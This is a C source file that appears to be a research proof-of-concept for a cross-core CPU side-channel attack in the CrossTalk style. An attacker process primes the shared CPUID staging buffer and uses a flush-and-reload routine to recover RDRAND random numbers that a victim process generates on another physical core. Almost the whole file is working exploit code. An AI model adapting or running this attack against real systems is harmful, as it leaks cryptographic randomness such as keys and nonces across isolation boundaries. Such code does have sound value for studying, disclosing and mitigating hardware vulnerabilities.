#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include "utils.h"


#define CYCLE_LENGTH 6000000



void victim(int cpu, int reps){
    set_processor_affinity(cpu);
    while(reps--){
        usleep(CYCLE_LENGTH);
        uint64_t random_number;
        asm volatile("rdrand %0":"=r"(random_number):);
        printf("[\e[32mVICTIM\e[39m]   Generated Random Number \e[32m0x%16lx\e[39m\n", random_number);
    }
    while(1);
}

void attacker(int cpu, int reps, void* mem){
    set_processor_affinity(cpu);
    char staging_buffer[65];
    staging_buffer[64] = 0;

    while(reps--){
        asm volatile(
        "mov $0x80000004, %%eax\n"
        "cpuid\n"
        "mfence\n"
        :::"eax");
        while (!staging_buffer_byte_changed(mem, 32, byte_32)){}
        uint64_t random_number = 0;
        vector_read(mem, 20000, staging_buffer, 32, 40, 0);
        for(int i = 0; i < 8; i++) {
            random_number = random_number << 8;
            random_number += staging_buffer[32 + (8 - i - 1)];
        }
        printf("[\e[31mATTACKER\e[39m] Recovered Random Number \e[31m0x%16lx\e[39m\n", random_number);
        fflush(stdout);
    }
}


int main(int argc, char **args) {
    printf("Demo 2: Observing RDRAND calls from another physical core.\n\n");
    _page_size = getpagesize();
    get_same_core_cpus(&attacker_cpu1, &attacker_cpu2);
    offcore_cpu = attacker_cpu1 + 1;
    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", attacker_cpu1, attacker_cpu2, offcore_cpu);
    fflush(stdout);
    uint8_t * mem = allocate_flush_reload_buffer();
    crosstalk_init(argc, args);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
    byte_32 = prime_and_get_cpuid(CPUID_BRAND_STRING_3_PRIMITIVE);
    pid = fork();
    if (!pid) victim_cpuid(0x80000002ul, attacker_cpu2);
    pid2 = fork();
    if(!pid2) attacker(attacker_cpu1, 50, mem);
    victim(offcore_cpu, 50);
    kill(pid2, SIGKILL);
    kill(pid, SIGKILL);
    munmap(mem-1, _page_size * 257);
    usleep(10000);
    crosstalk_cleanup();
    return 0;
}

